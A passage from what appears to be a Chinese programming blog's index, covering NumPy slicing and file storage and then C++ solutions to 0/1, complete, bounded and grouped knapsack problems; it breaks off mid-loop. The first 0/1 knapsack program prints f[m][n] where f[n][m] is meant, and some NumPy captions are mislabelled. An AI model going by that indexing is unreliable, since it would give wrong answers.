class="number">3.25</span>, <span class="number">5.5</span> , <span class="number">7.75</span>])</span><br><span class="line"></span><br><span class="line">c = np.concatenate((a, b)) <span class="comment">#要作为一个整体参数</span></span><br><span class="line"></span><br><span class="line">c</span><br><span class="line">Out[<span class="number">37</span>]: array([ <span class="number">1.</span>  ,  <span class="number">4.</span>  ,  <span class="number">7.</span>  , <span class="number">10.</span>  ,  <span class="number">1.</span>  ,  <span class="number">3.25</span>,  <span class="number">5.5</span> ,  <span class="number">7.75</span>])</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240519230435732.png" alt="image-20240519230435732"></p><h3 id="ndarray数组的操作"><a href="#ndarray数组的操作" class="headerlink" title="ndarray数组的操作"></a>ndarray数组的操作</h3><ul><li>索引和切片和python相同</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = np.arange(<span class="number">24</span>).reshape((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Out[<span class="number">39</span>]: </span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br><span class="line"></span><br><span class="line">a[-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line">Out[<span class="number">40</span>]: <span class="number">17</span></span><br><span class="line"></span><br><span class="line">a[:,<span class="number">1</span>,-<span class="number">3</span>]</span><br><span class="line">Out[<span class="number">41</span>]: array([ <span class="number">5</span>, <span class="number">17</span>])</span><br><span class="line"></span><br><span class="line">a[:,<span class="number">1</span>:<span class="number">3</span>,:]<span class="comment">#切片范围1，2。不包括3</span></span><br><span class="line">Out[<span class="number">42</span>]: </span><br><span class="line">array([[[ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br><span class="line"></span><br><span class="line">a[:,:,::<span class="number">2</span>]<span class="comment">#跳跃切片</span></span><br><span class="line">Out[<span class="number">43</span>]: </span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">6</span>],</span><br><span class="line">        [ <span class="number">8</span>, <span class="number">10</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">14</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">18</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">22</span>]]])</span><br></pre></td></tr></table></figure><h4 id="ndarray的运算"><a href="#ndarray的运算" class="headerlink" title="ndarray的运算"></a>ndarray的运算</h4><p>各种函数……</p><h3 id="NumPy数据的存取"><a href="#NumPy数据的存取" class="headerlink" title="NumPy数据的存取"></a>NumPy数据的存取</h3><h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><ul><li><code>CSV（Comma-Separated Values，逗号分隔值）文件</code>是一种常见的文本文件格式，用于存储表格数据。</li></ul><p>存储一维和二维数据：</p><ul><li><p><code>a = np.arange(100).reshape(5,20)</code></p></li><li><p><code>np.savetxt(&#39;a.csv&#39;,a,fmt=&#39;%d&#39;,delimiter  = &#39;,&#39;)</code>存储csv文件</p></li><li><code>np.b = np.loadtxt(&#39;a.csv&#39;,delimiter = &#39;,&#39;)</code>加载csv文件</li></ul><p>存储多维数据：</p><ul><li><p>我们需要将文件转化为对应的格式，即知道对应维度</p></li><li><p><code>a = np.arange(100).reshape(5,10,2)</code></p></li><li><p><code>a.tofile(&quot;b.dat&quot;,sep=&quot;,&quot;,format = &#39;%d&#39;)</code>存储csv文件</p></li><li><p><code>c = np.fromfile(&quot;b.dat&quot;,dtype = np.int32, sep=&#39;,&#39;).reshape(5,10,2)</code>加载csv文件</p></li></ul><p>使用npy文件存储：</p><ul><li><p>通过文件里包含维度信息来实现</p></li><li><p><code>np.save(&quot;a.npy&quot;,a)</code>存储npy文件</p></li><li><code>b = np.load(&quot;a.npy&quot;)</code>存储npy文件</li></ul><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><p>通过np.random生成</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/2024/05/15/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2024/05/15/%E7%AE%97%E6%B3%95/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>递归关系</p><ul><li>状态表示f[i,j]<ul><li>集合：从前i个物品选且体积小于j </li><li>属性：最大值，最小代价，数量</li></ul></li></ul><ul><li>状态计算——集合划分</li></ul><h3 id="01-背包"><a href="#01-背包" class="headerlink" title="01 背包"></a>01 背包</h3><ul><li><p>每件物品可以用一次</p></li><li><p>不包含第i个物品：f(i - 1, j)</p></li><li><p>包含第i个物品：f(i - 1,j - vi) + wi  空余一个vi的位置，加上第i个物品的权重</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N]; <span class="comment">//体积和价值</span></span><br><span class="line"><span class="type">int</span> f[N][N]; <span class="comment">//第一个N表示取第1~n个物品，第二个n表示从1开始到m的容量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; v[i] &gt;&gt; w[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)   <span class="comment">//从一个物品开始取</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) <span class="comment">//逐渐增大背包容量至m</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      f[i][j] = f[i - <span class="number">1</span>][j];    <span class="comment">//不取第i个物品</span></span><br><span class="line">      <span class="keyword">if</span> (j &gt;= v[i])            <span class="comment">//若有空间，比较取第i个物品和不取第i个物品的最大值</span></span><br><span class="line">        f[i][j] = max(f[i][j], f[i - <span class="number">1</span>][j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; f[m][n] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="comment">// 物品是由小到大排列的</span></span><br><span class="line">v[i] = <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line">w[i] = <span class="number">2</span> <span class="number">4</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line">    <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>       j</span><br><span class="line"><span class="number">0</span>   <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span> <span class="number">2</span>   </span><br><span class="line"><span class="number">2</span>   <span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">6</span> <span class="number">6</span> </span><br><span class="line"><span class="number">3</span>   <span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="number">4</span>   <span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>滚动数组写法:</p><ul><li>为什么要从后向前更新：因为当你计算 <code>f[j]</code> 时，<code>f[j-v[i]]</code> 可能已经被当前物品 <code>i</code> 更新过了。这意味着你可能会在同一轮次中多次使用同一个物品，违背了 0/1 背包的要求。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N]; <span class="comment">//体积和价值</span></span><br><span class="line"><span class="type">int</span> f[N]; <span class="comment">//采用滚动数组，滚动数组的本质还是减少空间复杂度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; v[i] &gt;&gt; w[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)      <span class="comment">//从一个物品开始取</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--) <span class="comment">//从后向前更新</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// f[j] = f[j];</span></span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  cout &lt;&lt; f[m] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h3><ul><li><p>每个物品有无限个</p></li><li><p>状态表示f[i,j]</p><ul><li>集合</li><li>属性</li></ul></li><li><p>状态计算——集合划分</p></li><li><p>f[i,j] = f[i - 1,j - v[i] <em> k] + w[i] </em> k</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; v[i] &gt;&gt; w[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) <span class="comment">//正序更新,依赖于当前f[i]层的数据</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k * v[i] &lt;= j; k++)</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j],</span><br><span class="line">                      f[i - <span class="number">1</span>][j - k * v[i]] + k * w[i]); <span class="comment">//与01背包思想差不多</span></span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; f[n][m] &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>优化，由于物品的数量是无限的，因此可以证明：</p><ul><li>f[i,j] = Max(f[i][j],  <code>f[i-1,j-v]+w,f[i-1,j-2v]+2w,f[i-1,j-3v]+3w,...)</code>等于<code>f[i,j-v]</code></li><li>/f[i,j-v] = Max(  ， f[i-1,j-v]  ,f[i-1,j-2v]+w,f[i-1,j-3v]+2w,…) </li><li>f[i, j] = Max(f[i - 1, j], f[i, j - v] + w)</li><li>正序更新的目的是让物品能够被多次使用。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"><span class="type">int</span> f[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;=  n; i ++ )  cin &gt;&gt; v[i] &gt;&gt; w[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = v[i]; j &lt;= m; j ++ )          <span class="comment">//正序更新,依赖于当前f[i]层的数据                  </span></span><br><span class="line">                    f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    cout &lt;&lt; f[m] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="完全背包与01背包的区别"><a href="#完全背包与01背包的区别" class="headerlink" title="完全背包与01背包的区别"></a>完全背包与01背包的区别</h3><ul><li>01背包：f[i, j] = max(f[i - 1, j],  <code>f[i - 1, j- v]</code>+ w)</li><li><p>完全背包：f[i,j] = max(f[i - 1, j], <code>f[i, j - v]</code> + w )</p></li><li><p>循环开始位置不同：01背包是避免覆盖，完全背包是必须覆盖（滑动窗口）</p></li></ul><h3 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a>多重背包</h3><ul><li>每个物品有限个</li><li>在完全背包的基础上限制物品数量</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N], s[N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; v[i] &gt;&gt; w[i] &gt;&gt; s[i];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) <span class="comment">//正序更新,依赖于当前f[i]层的数据</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k * v[i] &lt;= j &amp;&amp; k &lt;= s[i]; k++)</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j],f[i - <span class="number">1</span>][j - k * v[i]] + k * w[i]); </span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; f[n][m] &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>f[i,j] = f[i - 1,j - v[i] <em> k] + w[i] </em> k</p><p>不能装满，因此不能采用完全背包的优化</p><p>二进制优化：由于二进制$2^0……2^n$可以表示任意小于$2^n$的数，因此我们可以将一个物品拆成n</p><p>个二进制的物品</p><p>nlog2000</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">25000</span>; <span class="comment">// 1000 *log2 (200)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N], w[N];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> a, b, s;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; s;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt;= s) <span class="comment">// 拆分为多个小背包</span></span><br><span class="line">    &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = a * k; <span class="comment">// 体积：原始体积 a 乘以 k</span></span><br><span class="line">      w[cnt] = b * k; <span class="comment">// 价值：原始价值 b 乘以 k</span></span><br><span class="line">      s -= k;         <span class="comment">// 减去已经处理的数量</span></span><br><span class="line">      k *= <span class="number">2</span>;         <span class="comment">// 乘以 2，进入下一个更大的子背包</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>) <span class="comment">// 剩余部分作为一个小背包处理</span></span><br><span class="line">    &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = a * s;</span><br><span class="line">      w[cnt] = b * s;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//转化为01背包问题</span></span><br><span class="line">  n = cnt;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--)</span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; f[m] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分组背包"><a href="#分组背包" class="headerlink" title="分组背包"></a>分组背包</h3><ul><li>每组只能选一个</li></ul><p>类似于01背包问题，我们只需添加组内遍历即可。    </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;         </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> v[N][N], w[N][N], s[N];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; s[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= s[i]; j ++)</span><br><span class="line">            cin &gt;&gt; v[i][j] &gt;&gt; w[i][j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )      <span class="comment">//枚举所有组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = 